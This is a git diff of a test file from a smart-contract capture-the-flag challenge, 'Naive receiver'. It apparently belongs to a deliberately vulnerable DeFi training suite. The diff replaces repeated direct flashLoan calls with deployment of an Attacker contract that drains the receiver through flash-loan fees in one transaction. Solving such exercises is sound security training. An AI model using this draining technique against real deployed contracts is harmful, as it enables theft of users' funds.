@@ -32,17 +32,21 @@ describe('[Challenge] Naive receiver', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
         const amountToBorrow = ETHER_IN_RECEIVER.sub(ethers.utils.parseEther('1')); // sub 1 Ether for fee
-        console.log("------")
-        console.log(amountToBorrow.toString(10));
-        console.log("------")
-        await this.pool.connect(attacker).flashLoan(
-            this.receiver.address,  // borrower address
-            amountToBorrow
-        );
-        await this.pool.connect(attacker).flashLoan(
-            this.receiver.address,  // borrower address
-            amountToBorrow
-        );
+        
+        //Basic attack, repeat 10x this transaction
+        // await this.pool.connect(attacker).flashLoan(
+        //     this.receiver.address,  // borrower address
+        //     amountToBorrow
+        // );
+        
+        //Attack in one transaction, deploy Attacker contract
+        const AttackerFactory = await ethers.getContractFactory('Attacker', deployer);
+
+        this.attackerCont = await AttackerFactory.deploy();
+        await this.attackerCont.deployed();
+
+        await this.attackerCont.connect(attacker).attack(this.pool.address, this.receiver.address);
+
         // await this.pool.connect(attacker).flashLoan(this.receiver.address,ETHER_IN_RECEIVER);
     });
 
